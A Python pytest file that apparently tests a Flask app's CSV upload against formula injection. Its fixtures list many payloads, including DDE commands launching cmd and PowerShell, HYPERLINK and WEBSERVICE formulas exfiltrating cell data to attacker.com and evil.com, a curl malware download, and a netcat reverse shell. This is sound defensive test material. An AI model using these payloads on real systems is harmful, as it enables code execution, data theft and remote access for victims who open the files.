#!/usr/bin/env python3
"""
Advanced CSV Injection Security Testing
Comprehensive tests for CSV formula injection attacks, based on 2025 OWASP guidelines
and real-world attack vectors observed in production environments.
"""
import pytest
import io
import os
import sys
import pandas as pd
from unittest.mock import patch, MagicMock

# Import the Flask app
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
from app import app


class TestCSVInjectionAdvanced:
    """Advanced CSV injection attack testing"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        app.config['TESTING'] = True
        app.config['WTF_CSRF_ENABLED'] = False
        return app.test_client()
    
    @pytest.fixture
    def csv_injection_payloads_2025(self):
        """2025 CSV injection payloads based on latest security research"""
        return {
            # Classic formula injection
            'classic_calc': '=1+1+cmd|"/c calc"!A0',
            'classic_notepad': '+2+3+cmd|"/c notepad"!A0',
            'classic_whoami': '-2-3-cmd|"/c whoami"!A0',
            'classic_dir': '@SUM(1+1)*cmd|"/c dir"!A0',
            
            # DDE (Dynamic Data Exchange) attacks
            'dde_calc': '=cmd|"/c calc"!A0',
            'dde_powershell': '=cmd|"/c powershell.exe"!A0',
            'dde_system': '=EXEC("calc.exe")',
            
            # Data exfiltration attacks
            'exfiltration_basic': '=HYPERLINK("http://attacker.com/"&A1)',
            'exfiltration_advanced': '=HYPERLINK("http://evil.com/steal.php?data="&CONCATENATE(A1:Z1000))',
            'dns_exfiltration': '=WEBSERVICE("http://"&A1&".attacker.com/dns")',
            
            # Macro execution attempts
            'macro_auto_open': '=Auto_Open()',
            'macro_workbook_open': '=Workbook_Open()',
            'macro_shell': '=Shell("calc.exe")',
            
            # Advanced Excel formulas for exploitation
            'indirect_formula': '=INDIRECT("RC[-1]",FALSE)',
            'offset_exploit': '=OFFSET(A1,0,0,1,1)',
            'cell_reference': '=R1C1',
            
            # Cross-sheet references for bypass attempts  
            'sheet_reference': '=Sheet1!A1',
            'workbook_reference': '=[1]Sheet1!$A$1',
            
            # Unicode and encoding bypass attempts
            'unicode_equals': '＝1+1',  # Fullwidth equals sign
            'unicode_plus': '1＋1',    # Fullwidth plus sign
            'unicode_minus': '1－1',   # Fullwidth minus sign
            
            # Nested formulas for evasion
            'nested_if': '=IF(1=1,EXEC("calc"),"")',
            'nested_choose': '=CHOOSE(1,EXEC("calc"),"safe")',
            'nested_index': '=INDEX({"calc"},1)',
            
            # Advanced command execution
            'cmd_with_params': '=cmd|"/c dir /s"!A0',
            'powershell_encoded': '=cmd|"/c powershell -enc <base64>"!A0',
            'wscript_execution': '=cmd|"/c wscript script.vbs"!A0',
            
            # Time-based attacks
            'sleep_attack': '=cmd|"/c ping -n 10 127.0.0.1"!A0',
            'timeout_attack': '=cmd|"/c timeout 30"!A0',
            
            # File system attacks
            'file_read': '=cmd|"/c type C:\\Windows\\System32\\drivers\\etc\\hosts"!A0',
            'file_write': '=cmd|"/c echo malicious > C:\\temp\\evil.txt"!A0',
            'directory_listing': '=cmd|"/c dir C:\\ /s"!A0',
            
            # Network-based attacks
            'wget_download': '=cmd|"/c curl http://attacker.com/malware.exe -o malware.exe"!A0',
            'netcat_reverse': '=cmd|"/c nc -e cmd.exe attacker.com 4444"!A0',
            
            # Process enumeration
            'tasklist': '=cmd|"/c tasklist"!A0',
            'netstat': '=cmd|"/c netstat -an"!A0',
            'systeminfo': '=cmd|"/c systeminfo"!A0',
            
            # Registry manipulation
            'reg_query': '=cmd|"/c reg query HKLM\\SOFTWARE"!A0',
            'reg_add': '=cmd|"/c reg add HKCU\\Software\\Test /v Evil /d 1"!A0',
        }
    
    @pytest.fixture  
    def csv_injection_contexts(self):
        """Different contexts where CSV injection can occur"""
        return [
            'first_name',
            'last_name', 
            'company_name',
            'job_title',
            'email',
            'phone',
            'address',
            'city',
            'state',
            'country',
            'industry',
            'description',
            'notes',
            'website'
        ]

    def test_basic_formula_injection_detection(self, client, csv_injection_payloads_2025):
        """Test detection of basic CSV formula injection attacks"""
        for attack_name, payload in csv_injection_payloads_2025.items():
            # Create CSV with malicious payload in first column
            csv_content = f"First Name,Last Name,Company Name,Title,Industry\n{payload},Doe,Acme Corp,CEO,Technology"
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), f'injection_{attack_name}.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle malicious content without crashing
            assert response.status_code in [200, 302], f"Should handle {attack_name} injection"
            
            # Verify payload is not executed (check response for execution indicators)
            response_text = response.get_data(as_text=True)
            execution_indicators = [
                'calc', 'notepad', 'cmd', 'powershell', 'exec', 'shell',
                'system', 'malware', 'attacker.com', 'evil.com'
            ]
            
            for indicator in execution_indicators:
                assert indicator.lower() not in response_text.lower(), \
                       f"Response should not contain execution indicator '{indicator}' for {attack_name}"

    def test_csv_injection_in_all_fields(self, client, csv_injection_contexts):
        """Test CSV injection across all possible input fields"""
        dangerous_payload = '=cmd|"/c calc"!A0'
        
        for field_position, field_name in enumerate(csv_injection_contexts[:5]):  # Test first 5 fields
            # Create CSV with payload in specific field position
            fields = ['Safe'] * 5
            fields[field_position] = dangerous_payload
            
            csv_content = "First Name,Last Name,Company Name,Title,Industry\n" + ",".join(fields)
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), f'injection_field_{field_name}.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle injection in any field
            assert response.status_code in [200, 302], f"Should handle injection in {field_name}"

    def test_csv_injection_encoding_variations(self, client):
        """Test CSV injection with various encoding attempts"""
        base_payload = '=cmd|"/c calc"!A0'
        
        encoding_variations = [
            # URL encoding
            '=cmd%7C%22%2Fc%20calc%22%21A0',
            # HTML encoding
            '=cmd&#124;&quot;/c calc&quot;&#33;A0',
            # Double encoding
            '=cmd%257C%2522%252Fc%2520calc%2522%2521A0',
            # Unicode encoding
            '\\u003dcmd\\u007c\\u0022/c calc\\u0022\\u0021A0',
            # Base64 (partial)
            '=Y21kfCIvYyBjYWxjIiFBMA==',
        ]
        
        for i, encoded_payload in enumerate(encoding_variations):
            csv_content = f"First Name,Last Name,Company Name\n{encoded_payload},Test,Corp"
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), f'encoded_injection_{i}.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle encoded injections
            assert response.status_code in [200, 302], f"Should handle encoded injection {i}"

    def test_csv_injection_mixed_with_valid_data(self, client):
        """Test CSV injection mixed with large amounts of valid data"""
        # Create CSV with mostly valid data but some malicious entries
        csv_rows = ["First Name,Last Name,Company Name,Title,Industry"]
        
        # Add 100 valid rows
        for i in range(100):
            csv_rows.append(f"User{i},Lastname{i},Company{i},Title{i},Industry{i}")
        
        # Insert malicious payloads at various positions
        malicious_positions = [10, 25, 50, 75, 99]
        malicious_payloads = [
            '=cmd|"/c calc"!A0',
            '+cmd|"/c notepad"!A0', 
            '-cmd|"/c whoami"!A0',
            '@SUM(cmd|"/c dir"!A0)',
            '=HYPERLINK("http://evil.com/"&A1)'
        ]
        
        for pos, payload in zip(malicious_positions, malicious_payloads):
            csv_rows[pos + 1] = f"{payload},SafeLast,SafeCompany,SafeTitle,SafeIndustry"
        
        csv_content = "\n".join(csv_rows)
        
        data = {
            'file': (io.BytesIO(csv_content.encode()), 'mixed_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle mixed content safely
        assert response.status_code in [200, 302], "Should handle mixed malicious/valid data"

    def test_csv_injection_with_session_data(self, client):
        """Test that CSV injection doesn't contaminate session data"""
        malicious_payload = '=cmd|"/c calc"!A0'
        csv_content = f"First Name,Last Name,Company Name\n{malicious_payload},Test,Corp"
        
        data = {
            'file': (io.BytesIO(csv_content.encode()), 'session_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Check that session data doesn't contain malicious content
        with client.session_transaction() as sess:
            for key, value in sess.items():
                if isinstance(value, str):
                    dangerous_indicators = ['=cmd', '+cmd', '-cmd', '@SUM', 'calc', 'HYPERLINK']
                    for indicator in dangerous_indicators:
                        assert indicator not in value, f"Session data should not contain {indicator}"

    @patch('app.pd.read_csv')
    def test_csv_injection_pandas_sanitization(self, mock_read_csv, client):
        """Test that pandas properly handles malicious CSV content"""
        # Mock pandas to return DataFrame with malicious content
        malicious_df = pd.DataFrame({
            'First Name': ['=cmd|"/c calc"!A0'],
            'Company Name': ['Test Corp'],
            'Title': ['CEO']
        })
        mock_read_csv.return_value = malicious_df
        
        csv_content = "First Name,Company Name,Title\n=cmd|\"/c calc\"!A0,Test Corp,CEO"
        
        data = {
            'file': (io.BytesIO(csv_content.encode()), 'pandas_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Verify pandas was called
        mock_read_csv.assert_called_once()
        
        # Should handle malicious DataFrame content
        assert response.status_code in [200, 302], "Should handle malicious DataFrame"

    def test_csv_injection_output_sanitization(self, client):
        """Test that output files properly sanitize malicious formulas"""
        # This test requires the full workflow including email generation
        malicious_csv = """First Name,Last Name,Company Name,Title,Industry
=cmd|"/c calc"!A0,Smith,Acme Corp,CEO,Technology
John,=HYPERLINK("http://evil.com"),Tech Inc,CTO,Software"""
        
        # Upload malicious CSV
        data = {
            'file': (io.BytesIO(malicious_csv.encode()), 'output_test.csv')
        }
        
        response = client.post('/upload', data=data)
        
        if response.status_code == 200:
            # If successful, try to proceed to email generation
            # This would test the complete pipeline's sanitization
            
            # Check that the mapping page doesn't display raw malicious content
            response_text = response.get_data(as_text=True)
            
            # Should not display dangerous formulas directly
            dangerous_formulas = ['=cmd', '+cmd', '-cmd', '@SUM', 'HYPERLINK']
            for formula in dangerous_formulas:
                # Content might be HTML-encoded, so check for that too
                html_encoded = formula.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
                assert formula not in response_text or html_encoded in response_text, \
                       f"Dangerous formula {formula} should be encoded in output"

    def test_csv_injection_error_handling(self, client):
        """Test error handling when processing malicious CSV content"""
        # CSV that might cause pandas parsing errors
        problematic_csv = '''First Name,Last Name,Company
=INDIRECT("malicious_ref"),Test,Corp
"=cmd|"/c calc"!A0",Another,Company
=OFFSET(A1,999999,999999),Error,Test'''
        
        data = {
            'file': (io.BytesIO(problematic_csv.encode()), 'error_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle problematic content gracefully
        assert response.status_code in [200, 302], "Should handle problematic CSV gracefully"
        
        # Check that error messages don't reveal internal details
        if response.status_code == 302:
            response_text = response.get_data(as_text=True)
            internal_details = ['pandas', 'traceback', 'exception', __file__]
            for detail in internal_details:
                assert str(detail) not in response_text, f"Error should not reveal {detail}"

    def test_csv_injection_prevention_effectiveness(self, client):
        """Test the effectiveness of CSV injection prevention measures"""
        # Test various bypass attempts
        bypass_attempts = [
            # Tab characters
            '=\tcmd|"/c calc"!A0',
            # Null bytes  
            '=\x00cmd|"/c calc"!A0',
            # Alternative quotes
            "='cmd|'/c calc'!A0",
            # Mixed case
            '=CMD|"/C CALC"!A0',
            # Alternative separators
            '=cmd;"/c calc";A0',
            # Concatenation
            '=CONCATENATE("cmd","|","/c calc","!A0")',
            # Indirect references
            '=INDIRECT("R1C1",FALSE)',
        ]
        
        for i, attempt in enumerate(bypass_attempts):
            csv_content = f"First Name,Last Name,Company\n{attempt},Test,Corp"
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), f'bypass_{i}.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should prevent all bypass attempts
            assert response.status_code in [200, 302], f"Should handle bypass attempt {i}"
            
            # Check that bypass was neutralized
            response_text = response.get_data(as_text=True)
            execution_indicators = ['calc', 'cmd', 'exec', 'system']
            for indicator in execution_indicators:
                assert indicator.lower() not in response_text.lower(), \
                       f"Bypass attempt {i} should not execute {indicator}"


class TestCSVInjectionRealWorld:
    """Real-world CSV injection scenarios"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        app.config['TESTING'] = True
        return app.test_client()

    def test_csv_injection_from_user_input(self, client):
        """Test CSV injection scenarios that might come from user-generated content"""
        # Simulate user inputs that could contain injection
        user_inputs = [
            # User accidentally enters formula
            "=SUM(A1:A10)",
            # User tries to use Excel formula syntax
            "=VLOOKUP(A1,B:C,2,FALSE)",
            # Malicious user input
            '=cmd|"/c del *.*"!A0',
            # Social engineering attempt
            "Click here: =HYPERLINK(\"http://phishing.com\")",
        ]
        
        for i, user_input in enumerate(user_inputs):
            csv_content = f"First Name,Last Name,Company,Notes\nJohn,Doe,Acme,{user_input}"
            
            data = {
                'file': (io.BytesIO(csv_content.encode()), f'user_input_{i}.csv')
            }
            
            response = client.post('/upload', data=data)
            
            # Should handle user input safely
            assert response.status_code in [200, 302], f"Should handle user input {i} safely"

    def test_csv_injection_data_export_scenario(self, client):
        """Test CSV injection in data export scenarios"""
        # Simulate data that might be exported from another system
        export_data = '''Name,Email,Company,Bio
Normal User,user@example.com,Safe Corp,Regular employee
=cmd|"/c calc"!A0,attacker@evil.com,Malicious Corp,Penetration tester
John Smith,john@company.com,Tech Inc,"=HYPERLINK(""http://evil.com"",""Click here"")"
Jane Doe,jane@startup.com,StartupCo,=SUM(1+1)*cmd|"/c whoami"!A0'''
        
        data = {
            'file': (io.BytesIO(export_data.encode()), 'export_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle exported data with potential injections
        assert response.status_code in [200, 302], "Should handle exported data safely"

    def test_csv_injection_large_dataset(self, client):
        """Test CSV injection in large datasets"""
        # Create large CSV with scattered malicious content
        csv_rows = ["Name,Company,Title,Email,Phone"]
        
        # Add 1000 rows with occasional malicious content
        malicious_payloads = [
            '=cmd|"/c calc"!A0',
            '=HYPERLINK("http://evil.com")',
            '@SUM(cmd|"/c dir"!A0)',
            '=EXEC("malware.exe")'
        ]
        
        for i in range(1000):
            if i % 250 == 0 and i > 0:
                # Insert malicious payload every 250 rows
                payload_idx = (i // 250) - 1
                if payload_idx < len(malicious_payloads):
                    name = malicious_payloads[payload_idx]
                else:
                    name = f"User{i}"
            else:
                name = f"User{i}"
                
            csv_rows.append(f"{name},Company{i},Title{i},email{i}@test.com,555-000{i:04d}")
        
        large_csv = "\n".join(csv_rows)
        
        data = {
            'file': (io.BytesIO(large_csv.encode()), 'large_injection.csv')
        }
        
        response = client.post('/upload', data=data)
        
        # Should handle large datasets with injections
        assert response.status_code in [200, 302, 413], "Should handle large dataset safely"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])